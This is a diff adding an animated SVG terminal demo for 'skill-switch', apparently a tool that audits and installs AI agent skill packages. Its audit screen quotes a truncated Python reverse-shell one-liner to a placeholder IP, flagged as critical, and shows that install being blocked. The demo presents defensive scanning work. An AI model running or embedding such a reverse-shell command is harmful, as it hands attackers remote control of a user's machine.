@@ -1,0 +1,213 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="600" viewBox="0 0 960 600" role="img" aria-labelledby="title desc">
+  <title id="title">skill-switch animated terminal demo</title>
+  <desc id="desc">Animated CLI session showing scan, audit, blocked install, safe install, and doctor output.</desc>
+
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="960" y2="600" gradientUnits="userSpaceOnUse">
+      <stop offset="0" stop-color="#0d1117"/>
+      <stop offset="0.55" stop-color="#101722"/>
+      <stop offset="1" stop-color="#080c12"/>
+    </linearGradient>
+
+    <linearGradient id="panel" x1="42" y1="54" x2="918" y2="546" gradientUnits="userSpaceOnUse">
+      <stop offset="0" stop-color="#161f2b"/>
+      <stop offset="1" stop-color="#0b1119"/>
+    </linearGradient>
+
+    <linearGradient id="titlebar" x1="42" y1="54" x2="918" y2="98" gradientUnits="userSpaceOnUse">
+      <stop offset="0" stop-color="#182332"/>
+      <stop offset="1" stop-color="#0d141f"/>
+    </linearGradient>
+
+    <linearGradient id="accent" x1="100" y1="0" x2="860" y2="0" gradientUnits="userSpaceOnUse">
+      <stop offset="0" stop-color="#2dd4bf"/>
+      <stop offset="1" stop-color="#3fb950"/>
+    </linearGradient>
+
+    <radialGradient id="haloA" cx="0.2" cy="0.16" r="0.72">
+      <stop offset="0" stop-color="#2dd4bf" stop-opacity="0.18"/>
+      <stop offset="0.42" stop-color="#2dd4bf" stop-opacity="0.06"/>
+      <stop offset="1" stop-color="#2dd4bf" stop-opacity="0"/>
+    </radialGradient>
+
+    <radialGradient id="haloB" cx="0.78" cy="0.38" r="0.54">
+      <stop offset="0" stop-color="#3fb950" stop-opacity="0.18"/>
+      <stop offset="0.42" stop-color="#3fb950" stop-opacity="0.06"/>
+      <stop offset="1" stop-color="#3fb950" stop-opacity="0"/>
+    </radialGradient>
+
+    <pattern id="grid" width="32" height="32" patternUnits="userSpaceOnUse">
+      <path d="M32 0H0V32" fill="none" stroke="#8b949e" stroke-width="1" opacity="0.09"/>
+    </pattern>
+
+    <filter id="terminalShadow" x="-10%" y="-12%" width="120%" height="132%">
+      <feDropShadow dx="0" dy="24" stdDeviation="24" flood-color="#010409" flood-opacity="0.58"/>
+    </filter>
+
+    <clipPath id="terminalClip">
+      <rect x="42" y="54" width="876" height="492" rx="18"/>
+    </clipPath>
+  </defs>
+
+  <style>
+    svg {
+      font-family: ui-monospace, 'SF Mono', Menlo, Consolas, monospace;
+    }
+
+    text {
+      font-family: ui-monospace, 'SF Mono', Menlo, Consolas, monospace;
+      font-size: 13px;
+      dominant-baseline: middle;
+      white-space: pre;
+    }
+
+    .title {
+      font-size: 13px;
+      fill: #8b949e;
+    }
+
+    .prompt,
+    .ok {
+      fill: #3fb950;
+    }
+
+    .cmd {
+      fill: #f0f6fc;
+    }
+
+    .out {
+      fill: #8b949e;
+    }
+
+    .weak {
+      fill: #6e7681;
+    }
+
+    .red {
+      fill: #f85149;
+    }
+
+    .yellow {
+      fill: #d29922;
+    }
+
+    .terminal-line {
+      opacity: 1;
+      animation-duration: 17s;
+      animation-delay: 1ms;
+      animation-timing-function: ease-out;
+      animation-iteration-count: infinite;
+      animation-fill-mode: none;
+    }
+
+    .l00 { animation-name: reveal00; }
+    .l01 { animation-name: reveal01; }
+    .l02 { animation-name: reveal02; }
+    .l03 { animation-name: reveal03; }
+    .l04 { animation-name: reveal04; }
+    .l05 { animation-name: reveal05; }
+    .l06 { animation-name: reveal06; }
+    .l07 { animation-name: reveal07; }
+    .l08 { animation-name: reveal08; }
+    .l09 { animation-name: reveal09; }
+    .l10 { animation-name: reveal10; }
+    .l11 { animation-name: reveal11; }
+    .l12 { animation-name: reveal12; }
+    .l13 { animation-name: reveal13; }
+    .l14 { animation-name: reveal14; }
+    .l15 { animation-name: reveal15; }
+    .l16 { animation-name: reveal16; }
+    .l17 { animation-name: reveal17; }
+    .l18 { animation-name: reveal18; }
+
+    .cursor {
+      fill: #3fb950;
+      opacity: 1;
+      animation: cursorBlink 17s steps(1, end) 1ms infinite;
+    }
+
+    @keyframes reveal00 { 0%, 1.18% { opacity: 0; } 1.76%, 100% { opacity: 1; } }
+    @keyframes reveal01 { 0%, 3.53% { opacity: 0; } 4.12%, 100% { opacity: 1; } }
+    @keyframes reveal02 { 0%, 4.41% { opacity: 0; } 5.00%, 100% { opacity: 1; } }
+    @keyframes reveal03 { 0%, 5.00% { opacity: 0; } 5.59%, 100% { opacity: 1; } }
+    @keyframes reveal04 { 0%, 5.59% { opacity: 0; } 6.18%, 100% { opacity: 1; } }
+    @keyframes reveal05 { 0%, 6.18% { opacity: 0; } 6.76%, 100% { opacity: 1; } }
+    @keyframes reveal06 { 0%, 7.35% { opacity: 0; } 7.94%, 100% { opacity: 1; } }
+    @keyframes reveal07 { 0%, 17.06% { opacity: 0; } 17.65%, 100% { opacity: 1; } }
+    @keyframes reveal08 { 0%, 19.41% { opacity: 0; } 20.00%, 100% { opacity: 1; } }
+    @keyframes reveal09 { 0%, 20.88% { opacity: 0; } 21.47%, 100% { opacity: 1; } }
+    @keyframes reveal10 { 0%, 22.06% { opacity: 0; } 22.65%, 100% { opacity: 1; } }
+    @keyframes reveal11 { 0%, 34.12% { opacity: 0; } 34.71%, 100% { opacity: 1; } }
+    @keyframes reveal12 { 0%, 37.06% { opacity: 0; } 37.65%, 100% { opacity: 1; } }
+    @keyframes reveal13 { 0%, 38.24% { opacity: 0; } 38.82%, 100% { opacity: 1; } }
+    @keyframes reveal14 { 0%, 50.00% { opacity: 0; } 50.59%, 100% { opacity: 1; } }
+    @keyframes reveal15 { 0%, 52.94% { opacity: 0; } 53.53%, 100% { opacity: 1; } }
+    @keyframes reveal16 { 0%, 54.41% { opacity: 0; } 55.00%, 100% { opacity: 1; } }
+    @keyframes reveal17 { 0%, 65.88% { opacity: 0; } 66.47%, 100% { opacity: 1; } }
+    @keyframes reveal18 { 0%, 68.82% { opacity: 0; } 69.41%, 100% { opacity: 1; } }
+
+    @keyframes cursorBlink {
+      0%, 70.29% { opacity: 0; }
+      70.30%, 73.49% { opacity: 1; }
+      73.50%, 76.69% { opacity: 0; }
+      76.70%, 79.89% { opacity: 1; }
+      79.90%, 83.09% { opacity: 0; }
+      83.10%, 86.29% { opacity: 1; }
+      86.30%, 89.49% { opacity: 0; }
+      89.50%, 92.69% { opacity: 1; }
+      92.70%, 95.89% { opacity: 0; }
+      95.90%, 99.89% { opacity: 1; }
+      99.90%, 100% { opacity: 0; }
+    }
+  </style>
+
+  <rect width="960" height="600" fill="url(#bg)"/>
+  <rect width="960" height="600" fill="url(#haloA)"/>
+  <rect width="960" height="600" fill="url(#haloB)"/>
+  <rect width="960" height="600" fill="url(#grid)"/>
+  <path d="M92 116H260" stroke="url(#accent)" stroke-width="2.4" stroke-linecap="round" opacity="0.54"/>
+  <path d="M706 504H868" stroke="url(#accent)" stroke-width="2.2" stroke-linecap="round" opacity="0.32"/>
+
+  <g filter="url(#terminalShadow)">
+    <rect x="42" y="54" width="876" height="492" rx="18" fill="url(#panel)" stroke="#30363d" stroke-width="1.2"/>
+    <g clip-path="url(#terminalClip)">
+      <rect x="42" y="54" width="876" height="44" fill="url(#titlebar)"/>
+      <rect x="42" y="97" width="876" height="1" fill="#30363d" opacity="0.75"/>
+      <rect x="42" y="98" width="876" height="448" fill="#0b1119" opacity="0.2"/>
+      <rect x="42" y="54" width="876" height="492" fill="url(#grid)" opacity="0.25"/>
+      <rect x="42.7" y="54.7" width="874.6" height="490.6" rx="17.3" fill="none" stroke="#2dd4bf" stroke-opacity="0.13"/>
+    </g>
+
+    <circle cx="66" cy="76" r="6.5" fill="#ff5f56"/>
+    <circle cx="88" cy="76" r="6.5" fill="#ffbd2e"/>
+    <circle cx="110" cy="76" r="6.5" fill="#27c93f"/>
+    <text class="title" x="480" y="76" text-anchor="middle" xml:space="preserve">skill-switch — 安全门 + 一键回滚</text>
+
+    <g transform="translate(76 122)">
+      <text class="terminal-line l00" x="0" y="0" xml:space="preserve"><tspan class="prompt">❯ </tspan><tspan class="cmd">skill-switch scan</tspan></text>
+      <text class="terminal-line l01" x="0" y="20" xml:space="preserve"><tspan class="weak">DIR             SKILL               NAME                AGENTS            STATUS</tspan></text>
+      <text class="terminal-line l02" x="0" y="40" xml:space="preserve"><tspan class="out">.agents/skills  deploy-checklist    deploy-checklist    cline,dexto +4    </tspan><tspan class="ok">ok</tspan></text>
+      <text class="terminal-line l03" x="0" y="60" xml:space="preserve"><tspan class="out">.claude/skills  commit-style        commit-style        claude-code       </tspan><tspan class="ok">ok</tspan></text>
+      <text class="terminal-line l04" x="0" y="80" xml:space="preserve"><tspan class="out">.claude/skills  git-helper          git-helper          claude-code       </tspan><tspan class="ok">ok</tspan></text>
+      <text class="terminal-line l05" x="0" y="100" xml:space="preserve"><tspan class="out">.gemini/skills  code-review-helper  code-review-helper  gemini-cli        </tspan><tspan class="ok">ok</tspan></text>
+      <text class="terminal-line l06" x="0" y="120" xml:space="preserve"><tspan class="cmd">共 6 个 skill</tspan></text>
+
+      <text class="terminal-line l07" x="0" y="154" xml:space="preserve"><tspan class="prompt">❯ </tspan><tspan class="cmd">skill-switch audit ./revshell-python</tspan></text>
+      <text class="terminal-line l08" x="0" y="174" xml:space="preserve"><tspan class="out">score: </tspan><tspan class="yellow">80/100</tspan><tspan class="out">  verdict: </tspan><tspan class="yellow">REVIEW</tspan><tspan class="out">  findings: 1</tspan></text>
+      <text class="terminal-line l09" x="0" y="194" xml:space="preserve"><tspan class="red">  [CRITICAL]</tspan><tspan class="cmd"> reverse-shell/scripting-socket  </tspan><tspan class="weak">SKILL.md:11</tspan></text>
+      <text class="terminal-line l10" x="0" y="214" xml:space="preserve"><tspan class="weak">    &gt; </tspan><tspan class="out">python3 -c 'socket.connect(("198.51.100.7",4444)); /bin/sh -i'…</tspan></text>
+
+      <text class="terminal-line l11" x="0" y="248" xml:space="preserve"><tspan class="prompt">❯ </tspan><tspan class="cmd">skill-switch install ./revshell-python --agent claude-code</tspan></text>
+      <text class="terminal-line l12" x="0" y="268" xml:space="preserve"><tspan class="red">✗ audit 拦截,未安装任何 skill</tspan></text>
+      <text class="terminal-line l13" x="0" y="288" xml:space="preserve"><tspan class="out">  revshell-python  </tspan><tspan class="yellow">score=80</tspan><tspan class="out">  findings=1  </tspan><tspan class="weak">(--force 可越过)</tspan></text>
+
+      <text class="terminal-line l14" x="0" y="322" xml:space="preserve"><tspan class="prompt">❯ </tspan><tspan class="cmd">skill-switch install ./api-client --agent claude-code</tspan></text>
+      <text class="terminal-line l15" x="0" y="342" xml:space="preserve"><tspan class="ok">✓ </tspan><tspan class="cmd">api-client</tspan><tspan class="out"> → ~/.claude/skills/api-client</tspan></text>
+      <text class="terminal-line l16" x="0" y="362" xml:space="preserve"><tspan class="weak">  ↳ 装前已快照 · 写入 lock + 声明(可一键回滚)</tspan></text>
+
+      <text class="terminal-line l17" x="0" y="396" xml:space="preserve"><tspan class="prompt">❯ </tspan><tspan class="cmd">skill-switch doctor</tspan></text>
+      <text class="terminal-line l18" x="0" y="416" xml:space="preserve"><tspan class="ok">✓ </tspan><tspan class="cmd">三方一致</tspan><tspan class="out">(声明 × 锁 × 磁盘)</tspan></text>
+      <rect class="cursor" x="218" y="408" width="8.5" height="15.5" rx="1.5"/>
+    </g>
+  </g>
+</svg>
